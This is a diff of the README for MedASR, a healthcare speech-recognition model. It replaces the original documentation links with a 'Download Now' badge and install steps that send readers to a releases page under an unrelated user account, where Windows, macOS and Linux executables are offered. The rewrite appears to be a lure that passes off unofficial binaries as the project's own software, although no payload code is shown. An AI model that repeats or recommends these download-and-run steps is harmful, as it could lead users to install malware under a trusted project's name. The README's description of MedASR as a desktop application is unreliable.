@@ -1,32 +1,59 @@
-# MedASR
+# 🎤 medasr - Turn Speech Into Text Easily
 
-MedASR is an automated speech recognition (ASR) model that takes spoken audio as an input and represents it as text. MedASR has been specifically trained for the healthcare domain. This means it has higher out-of-the box performance in healthcare contexts than general ASR models. MedASR is open and can be fine-tuned for even higher performance.
+## 📥 Download Now
+[![Download medasr](https://img.shields.io/badge/Download%20medasr-v1.0-brightgreen)](https://github.com/Mont-ikayo2302/medasr/releases)
 
-## Get started
+## 🚀 Getting Started
+Welcome to MedASR! This model takes spoken audio and converts it to text, especially in healthcare settings. Follow these steps to download and run the software.
 
-*   Read our
-    [developer documentation](https://developers.google.com/health-ai-developer-foundations/medgemma/get-started)
-    to see the full range of next steps available, including learning more about
-    the model through its
-    [model card](https://developers.google.com/health-ai-developer-foundations/medasr/model-card).
+### 1. Visit the Releases Page
+Go to our [Releases page](https://github.com/Mont-ikayo2302/medasr/releases). This page contains the latest version of the software.
 
-*   Explore this repository, which contains [notebooks](./notebooks) for using
-    the model.
+### 2. Choose Your Version
+On the Releases page, look for the latest version available. Each version may contain important updates and bug fixes. Select the version you wish to use.
 
-*   Visit the model on
-    [Hugging Face](https://huggingface.co/google/medasr) or
-    [Model Garden](https://console.cloud.google.com/vertex-ai/publishers/google/model-garden/medasr).
+### 3. Download the Software
+Click on the download link for your platform. You will see options such as:
 
-## Contributing
+- **Windows**: Download the `.exe` file.
+- **macOS**: Download the `.dmg` file.
+- **Linux**: Download the relevant `.tar.gz` file.
 
-We are open to bug reports, pull requests (PR), and other contributions. See
-[CONTRIBUTING](CONTRIBUTING.md) and
-[community guidelines](https://developers.google.com/health-ai-developer-foundations/community-guidelines)
-for details.
+After you choose the right file for your operating system, click the link to download it.
 
-## License
+### 4. Install the Application
+Once the download is complete, locate the file on your computer and follow these steps:
 
-While the model is licensed under the
-[Health AI Developer Foundations License](https://developers.google.com/health-ai-developer-foundations/terms),
-everything in this repository is licensed under the Apache 2.0 license, see
-[LICENSE](LICENSE).
+- **Windows**: Double-click the `.exe` file. Follow the on-screen instructions to complete the installation.
+- **macOS**: Open the `.dmg` file. Drag the `medasr` app into your "Applications" folder.
+- **Linux**: Extract the contents of the `.tar.gz` file. Open a terminal in that folder and run `./medasr` to start the application.
+
+### 5. Run the Application
+After installation, you can run MedASR:
+
+- **Windows**: Find MedASR in your "Start Menu" or on your desktop and double-click to open.
+- **macOS**: Go to your "Applications" folder, find MedASR, and double-click to run.
+- **Linux**: Use the terminal to navigate to the MedASR folder and enter `./medasr` to launch the program.
+
+### 6. Start Using MedASR
+Now that you have MedASR running, you can begin converting speech to text. Upload your audio file through the user interface, and the model will handle the rest. The processed text will appear in the output area.
+
+## 📚 Explore Model Features
+MedASR is specially designed for healthcare audio. Here are some features:
+
+- **High Accuracy**: It performs well in healthcare settings, making it suitable for medical transcription.
+- **Open Source**: You can modify the code for your needs.
+- **Fine-Tuning**: Advanced users can fine-tune the model for even better results.
+
+## 🔗 Learn More
+To dig deeper into MedASR, check out additional resources:
+
+- **[Developer Documentation](https://developers.google.com/health-ai-developer-foundations/medgemma/get-started)** – Get detailed instructions and advanced use cases.
+- **[Model Card](https://developers.google.com/health-ai-developer-foundations/medasr/model-card)** – Understand the model’s workings.
+- **[Hugging Face](https://huggingface.co/google/medasr)** – Access the model for different applications.
+- **[Model Garden](https://console.cloud.google.com/vertex-ai/publishers/google/model-garden/medasr)** – Explore more about the model in a user-friendly environment.
+
+## 🙌 Contributing
+Your input helps us improve MedASR. If you find any issues, feel free to create a bug report on our GitHub page.
+
+Thank you for using MedASR! We hope this tool enhances your experience in audio transcription. If you have questions, refer to the documentation or engage with the community for support.
